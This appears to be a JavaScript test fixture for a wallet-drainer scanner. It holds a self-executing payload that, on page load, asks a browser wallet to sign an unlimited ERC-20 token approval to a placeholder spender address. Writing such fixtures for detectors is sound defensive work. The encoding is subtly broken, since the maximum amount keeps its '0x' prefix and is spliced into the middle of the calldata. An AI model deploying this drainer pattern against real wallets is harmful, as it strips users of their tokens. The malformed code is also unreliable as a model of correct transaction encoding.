// QA fixture only: defensive scanner test payload. Do not use against real users.
(function () {
  const spender = '0x9999999999999999999999999999999999999999';
  const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  window.__bp411Fixture = { type: 'fake-drainer-payload', spender, max };
  if (window.ethereum) {
    window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: '0x3333333333333333333333333333333333333333',
        to: '0x7777777777777777777777777777777777777777',
        data: '0x095ea7b3' + spender.slice(2).padStart(64, '0') + max.padStart(64, '0'),
        value: '0x0'
      }]
    });
  }
})();
